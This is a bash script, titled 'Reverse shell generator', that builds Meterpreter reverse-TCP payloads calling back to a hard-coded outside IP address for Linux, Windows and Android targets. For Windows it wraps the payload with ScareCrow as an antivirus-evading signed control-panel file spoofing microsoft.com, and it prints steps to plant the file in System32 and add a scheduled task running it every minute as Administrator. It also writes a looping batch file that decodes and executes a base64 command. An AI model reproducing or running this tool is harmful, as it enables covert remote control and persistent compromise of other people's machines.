#!/bin/bash
# Reverse shell generator
LHOST="194.164.196.175"
LPORT="420"
if ! command -v msfvenom &> /dev/null ; then
    yay metasploit
fi
installopensslold() {
cat <<EOF > PKGBUILD
pkgname="osslsigncode"
pkgver="2.8"
pkgrel="2"
pkgdesc="OpenSSL based Authenticode signing for PE/MSI/Java CAB files"
arch=('i686' 'x86_64')
url="https://github.com/mtrojnar/osslsigncode"
license=('GPL')
depends=('curl' 'openssl-1.1')
makedepends=('cmake' 'perl' 'python')
checkdepends=('libfaketime')
source=("https://github.com/mtrojnar/${pkgname}/archive/${pkgver}.tar.gz")
options=('!check')
sha512sums=('SKIP')
prepare() {
  cmake \
    -B build -S "$srcdir/osslsigncode-${pkgver}" \
    -DCMAKE_BUILD_TYPE=Release \
    -DCMAKE_INSTALL_PREFIX=/usr \
    -DOPENSSL_ROOT_DIR="/usr/include/openssl-1.1"  # Path to OpenSSL 1.1
}
build() {
  cmake --build build
}
check() {
  cd build
  ctest Release
}
package() {
  cd build
  python Testing/client_http.py || true 2> /dev/null
  cd ..
  DESTDIR="$pkgdir" cmake --install build
}
EOF
sudo makepkg -si --noconfirm
rm -rf PKGBUILD
}
if [[ $1 == "-h" ]]; then 
    echo -e "Options>\n linux\n windows\n android"
    exit
elif [[ $1 == "linux" ]]; then
    msfvenom -p python/meterpreter_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" MeterpreterTryToFork=false -o shell
    sed -i '1i#!/bin/python3' shell
    chmod +x ./shell
elif [[ $1 == "python-batch" ]]; then
    read -p "Base64 Raw Cmd Payload: " base
    echo -e "@echo off\n:loop\npython3 -c \"__import__('os').system(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('$base')[0]).decode('utf-8'))\"\ngoto loop" > shell.bat
    unix2dos shell.bat 2> /dev/null
    rm -rf shell
elif [[ $1 == "windows" ]]; then 
    payload_file="$HOME/.local/ScareCrow/av-bypass.bin"
    if [[ ! -d $HOME/.local/ScareCrow ]]; then
        yay --needed metasploit osslsigncode openssl    
        installopensslold
        sudo pacman -Sy --noconfirm mingw-w64
        cd "$HOME/.local"
        git clone https://github.com/optiv/ScareCrow
        cd "$HOME/.local/ScareCrow"
        go build ScareCrow.go
    fi
    cd "$HOME/.local/ScareCrow"
    rm -rf ./*.exe ./*.cpl ./*.dll "$payload_file" 2> /dev/null 2>&1
    msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -e x64/shikata_ga_nai -b '\x00' -f raw -o "$payload_file"
    check_files() {
        local count=0
        for extension in exe cpl dll; do
            files=$(ls "$HOME/.local/ScareCrow"/*."$extension" 2>/dev/null)
            if [ -n "$files" ]; then
                count=$((count + $(echo "$files" | wc -l)))
            fi
        done
        if [ "$count" -gt 1 ]; then
            return 0
        else
            return 1
        fi
    }
    while :
    do 
        ./ScareCrow -I "$payload_file" --domain www.microsoft.com --encryptionmode AES -Loader control | tail -n +12 | head -n -1
        if check_files 2> /dev/null 2>&1; then
            break
        fi
    done
    echo -e "Rename the .cpl in system.cpl"
    echo -e "Put in C:Windows/System32/ system.cpl"
    echo -e "and with cmd as admin run :"
    echo ' schtasks /create /tn System /tr "control %windir%\system32\system.cpl" /sc MINUTE /mo 1 /ru Administrator /rl HIGHEST /it'
elif [[ $1 == "android" ]]; then 
    msfvenom -p android/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -o payload.apk
fi
